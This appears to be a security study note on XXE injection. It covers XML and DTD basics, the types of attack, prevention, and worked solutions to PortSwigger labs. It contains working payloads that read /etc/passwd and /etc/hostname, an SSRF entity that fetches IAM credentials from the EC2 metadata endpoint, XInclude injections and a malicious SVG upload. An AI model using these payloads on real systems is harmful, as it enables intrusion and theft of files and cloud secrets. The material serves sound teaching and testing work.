# XXE (XML External Entity)

## What is XXE&#x20;

XML external entity injection (also known as XXE) is a web security vulnerability that allows an attacker to interfere with an application's processing of XML data. It often allows an attacker to view files on the application server filesystem, and to interact with any back-end or external systems that the application itself can access.

In some situations, an attacker can escalate an XXE attack to compromise the underlying server or other back-end infrastructure, by leveraging the XXE vulnerability to perform server-side request forgery (SSRF) attacks.

There are two types of XXE attacks

1. In-band - An in-band XXE attack is the one in which the attacker can receive an immediate response to the XXE payload.
2. Out-of-band - An out-of-band XXE attacks (also called blind XXE), there is no immediate response from the web application and attacker has to reflect the output of their XXE payload to some other file or their own server.

## What is XML

XML (eXtensible Markup Language) is a markup language that defines a set of rules for encoding documents in a format that is both human-readable and machine-readable. It is a markup language used for storing and transporting data.

### XML Basics

#### Why we use XML?

1. XML is platform-independent and programming language independent, thus it can be used on any system and supports the technology change when that happens.
2. The data stored and transported using XML can be changed at any point in time without affecting the data presentation.
3. XML allows validation using DTD and Schema. This validation ensures that the XML document is free from any syntax error.
4. XML simplifies data sharing between various systems because of its platform-independent nature. XML data doesn’t require any conversion when transferred between different systems.

#### Syntax

Every XML document mostly starts with what is known as XML Prolog.

`<?xml version="1.0" encoding="UTF-8"?>`

Above the line is called XML prolog and it specifies the XML version and the encoding used in the XML document. This line is not compulsory to use but it is considered a `good practice` to put that line in all your XML documents.

Every XML document must contain a ROOT element. Ex:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<mail>
   <to>falcon</to>
   <from>feast</from>
   <subject>About XXE</subject>
   <text>Teach about XXE</text>
</mail>
```

In the above example the `<mail>` is the ROOT element of that document and `<to>`, `<from>`, `<subject>`, `<text>` are the children elements. If the XML document doesn't have any root element then it would be considered `wrong` or `invalid` XML doc.

Another thing to remember is that XML is a case sensitive language. If a tag starts like `<to>` then it has to end by `</to>` and not by something like `</To>`(notice the capitalization of `T`)

Like HTML we can use attributes in XML too. The syntax for having atributes is also very similar to HTML. Ex:

`<text category = "message">You need to learn about XXE</text>`

In the above example `category` is the attribute name and `message` is the attribute value.

### DTD File

DTD stands for Document Type Definition. A DTD defines the structure and the legal elements and attributes of an XML document.

Let us try to understand this with the help of an example. Say we have a file named `note.dtd` with the following content:

`<!DOCTYPE note [ <!ELEMENT note (to,from,heading,body)> <!ELEMENT to (#PCDATA)> <!ELEMENT from (#PCDATA)> <!ELEMENT heading (#PCDATA)> <!ELEMENT body (#PCDATA)> ]>`

Now we can use this DTD to validate the information of some XML document and make sure that the XML file conforms to the rules of that DTD.

Ex: Below is given an XML document that uses `note.dtd`

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE note SYSTEM "note.dtd">
<note>
    <to>falcon</to>
    <from>feast</from>
    <heading>hacking</heading>
    <body>XXE attack</body>
</note> 
```

So now let's understand how that DTD validates the XML. Here's what all those terms used in `note.dtd` mean

* !DOCTYPE note -  Defines a root element of the document named **note**
* !ELEMENT note - Defines that the note element must contain the elements: "to, from, heading, body"
* !ELEMENT to - Defines the `to` element to be of type "#PCDATA"
* !ELEMENT from - Defines the `from` element to be of type "#PCDATA"
* !ELEMENT heading  - Defines the `heading` element to be of type "#PCDATA"
* !ELEMENT body - Defines the `body` element to be of type "#PCDATA"

&#x20;   NOTE: #PCDATA means parseable character data.

## XXE Attacks

* **Exploiting XXE to retrieve files**, where an external entity is defined containing the contents of a file, and returned in the application's response.
* **Exploiting XXE to perform SSRF attacks**, where an external entity is defined based on a URL to a back-end system.
* **Exploiting blind XXE exfiltrate data out-of-band**, where sensitive data is transmitted from the application server to a system that the attacker controls.
* **Exploiting blind XXE to retrieve data via error messages**, where the attacker can trigger a parsing error message containing sensitive data.

### Exploiting XXE to retrieve files

To perform an XXE injection attack that retrieves an arbitrary file from the server's filesystem, you need to modify the submitted XML in two ways:

* Introduce (or edit) a `DOCTYPE` element that defines an external entity containing the path to the file.
* Edit a data value in the XML that is returned in the application's response, to make use of the defined external entity.

For example, suppose a shopping application checks for the stock level of a product by submitting the following XML to the server:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck><productId>381</productId></stockCheck>
```

The application performs no particular defenses against XXE attacks, so you can exploit the XXE vulnerability to retrieve the `/etc/passwd` file by submitting the following XXE payload:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId></stockCheck> 
```

This XXE payload defines an external entity `&xxe;` whose value is the contents of the `/etc/passwd` file and uses the entity within the `productId` value. This causes the application's response to include the contents of the file:

```html
Invalid product ID: root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
...
```

### Exploiting XXE to perform SSRF attacks

To exploit an XXE vulnerability to perform an SSRF attack, you need to define an external XML entity using the URL that you want to target, and use the defined entity within a data value. If you can use the defined entity within a data value that is returned in the application's response, then you will be able to view the response from the URL within the application's response, and so gain two-way interaction with the back-end system. If not, then you will only be able to perform blind SSRF attacks (which can still have critical consequences).

In the following XXE example, the external entity will cause the server to make a back-end HTTP request to an internal system within the organization's infrastructure:

```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal.vulnerable-website.com/"> ]> 
```

### Exploiting Blind XXE

#### XInclude Attacks

Some applications receive client-submitted data, embed it on the server-side into an XML document, and then parse the document. An example of this occurs when client-submitted data is placed into a back-end SOAP request, which is then processed by the backend SOAP service.

In this situation, you cannot carry out a classic XXE attack, because you don't control the entire XML document and so cannot define or modify a DOCTYPE element. However, you might be able to use XInclude instead. XInclude is a part of the XML specification that allows an XML document to be built from sub-documents. You can place an XInclude attack within any data value in an XML document, so the attack can be performed in situations where you only control a single item of data that is placed into a server-side XML document.

To perform an `XInclude` attack, you need to reference the `XInclude` namespace and provide the path to the file that you wish to include. For example:

```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/></foo>
```

#### XXE Attacks via file upload

Some applications allow users to upload files which are then processed server-side. Some common file formats use XML or contain XML subcomponents. Examples of XML-based formats are office document formats like DOCX and image formats like SVG.

For example, an application might allow users to upload images, and process or validate these on the server after they are uploaded. Even if the application expects to receive a format like PNG or JPEG, the image processing library that is being used might support SVG images. Since the SVG format uses XML, an attacker can submit a malicious SVG image and so reach hidden attack surface for XXE vulnerabilities.

#### XXE Attacks via modified content type

Most POST requests use a default content type that is generated by HTML forms, such as `application/x-www-form-urlencoded`. Some web sites expect to receive requests in this format but will tolerate other content types, including XML.

For example, if a normal request contains the following:

```http
POST /action HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 7

foo=bar 
```

Then you might be able submit the following request, with the same result:

```http
POST /action HTTP/1.0
Content-Type: text/xml
Content-Length: 52

<?xml version="1.0" encoding="UTF-8"?><foo>bar</foo> 
```

If the application tolerates requests containing XML in the message body, and parses the body content as XML, then you can reach the hidden XXE attack surface simply by reformatting requests to use the XML format.

### How to find and test for XXE vulnerabilities

The vast majority of XXE vulnerabilities can be found quickly and reliably using Burp Suite's web vulnerability scanner.

Manually testing for XXE vulnerabilities generally involves:

* Testing for file retrieval by defining an external entity based on a well-known operating system file and using that entity in data that is returned in the application's response.
* Testing for blind XXE vulnerabilities by defining an external entity based on a URL to a system that you control, and monitoring for interactions with that system. [Burp Collaborator client](https://portswigger.net/burp/documentation/desktop/tools/collaborator-client) is perfect for this purpose.
* Testing for vulnerable inclusion of user-supplied non-XML data within a server-side XML document by using an XInclude attack to try to retrieve a well-known operating system file.

### How to prevent XXE vulnerabilities

Virtually all XXE vulnerabilities arise because the application's XML parsing library supports potentially dangerous XML features that the application does not need or intend to use. The easiest and most effective way to prevent XXE attacks is to disable those features.

Generally, it is sufficient to disable resolution of external entities and disable support for XInclude. This can usually be done via configuration options or by programmatically overriding default behavior. Consult the documentation for your XML parsing library or API for details about how to disable unnecessary capabilities.

## XXE Payloads

Defining a `ENTITY` called `name` and assigning it a value `feast`. Later we are using that ENTITY in our code.

```xml
<!DOCTYPE replace [<!ENTITY name "feast"> ]>
 <userInfo>
  <firstName>falcon</firstName>
  <lastName>&name;</lastName>
 </userInfo>xml
```

We can also use XXE to read some file from the system by defining an ENTITY and having it use the SYSTEM keyword

```xml
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY read SYSTEM 'file:///etc/passwd'>]>
<root>&read;</root>
```

Here again, we are defining an ENTITY with the name `read` but the difference is that we are setting it value to \`SYSTEM\` and path of the file.

{% embed url="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection" %}

## Exploiting XXE Strategy

* Place XML Payloads in input fields and URL parameters i.e. Login forms.
* Upload an XML payload file wherever possible.
* Intercept the request and look for any kind of XML data format.
* Replace found XML content with XML payloads.
* Use Python or Burp Collaborator as a web server to look for Blind XXE
  * `<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "burp collaborator URL"> ]`

## Increasing Attack Surface

* SVG is just XML describing images
  * Wherever we can upload an image --> XXE if svg is possible
* DOCX/XLSX can also be used for XXE
  * [https://doddsecurity.com/312/xml-external-entity-injection-xxe-in-opencats-applicant-tracking-system/](https://doddsecurity.com/312/xml-external-entity-injection-xxe-in-opencats-applicant-tracking-system/)
* SOAP Requests are also just XML requests

## Examples

### PortSwigger Labs

#### Exploiting XXE using external entities to retrieve files

> This lab has a "Check stock" feature that parses XML input and returns any unexpected values in the response.
>
> Inject an XML external entity to retrieve the contents of the /etc/passwd file.

After selecting the 'Check Stock' button we see the below request body in Developer Tools

```xml
<?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>20</productId><storeId>1</storeId></stockCheck>
```

Payload used when editing and re-sending the request

```xml
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTITY read SYSTEM 'file:///etc/passwd'>]><stockCheck><productId>&read;</productId><storeId>1</storeId></stockCheck>
```

#### Exploiting XXE to perform SSRF attacks

> The lab server is running a (simulated) EC2 metadata endpoint at the default URL, which is http://169.254.169.254/. This endpoint can be used to retrieve data about the instance, some of which might be sensitive.
>
> Exploit the XXE vulnerability to perform an SSRF attack that obtains the server's IAM secret access key from the EC2 metadata endpoint.

After selecting the 'Check Stock' button we see the below request body in Developer Tools

```
<?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
```

Payload used when editing and re-sending the request after iteratively appending to `/latest/meta-data/` in the URL request

```
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]> <stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
```

#### Exploiting XInclude to retrieve files

> Because you don't control the entire XML document you can't define a DTD to launch a classic XXE attack.
>
> To solve the lab, inject an `XInclude` statement to retrieve the contents of the `/etc/passwd` file.

After selecting the 'Check Stock' button we see the below request body in Developer Tools

```http
productId=1&storeId=1
```

Payload use after replacing the `productId=` parameter with the payload

```http
productId=<foo xmlns:xi="http://www.w3.org/2001/XInclude"> <xi:include parse="text" href="file:///etc/passwd"/></foo>&storeId=1
```

#### Exploiting XXE via image file upload

> This lab lets users attach avatars to comments and uses the Apache Batik library to process avatar image files.
>
> To solve the lab, upload an image that displays the contents of the `/etc/hostname` file after processing. Then use the "Submit solution" button to submit the value of the server hostname.

Found exploit for mentioned Apache Batik library: [https://insinuator.net/2015/03/xxe-injection-in-apache-batik-library-cve-2015-0250/](https://insinuator.net/2015/03/xxe-injection-in-apache-batik-library-cve-2015-0250/)

Created an .svg file with the below payload then used that as the uploaded avatar image file

```xml
<?xml version="1.0" standalone="yes"?><!DOCTYPE ernw [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-family="Verdana" font-size="16" x="0" y="16">&xxe;</text></svg>
```

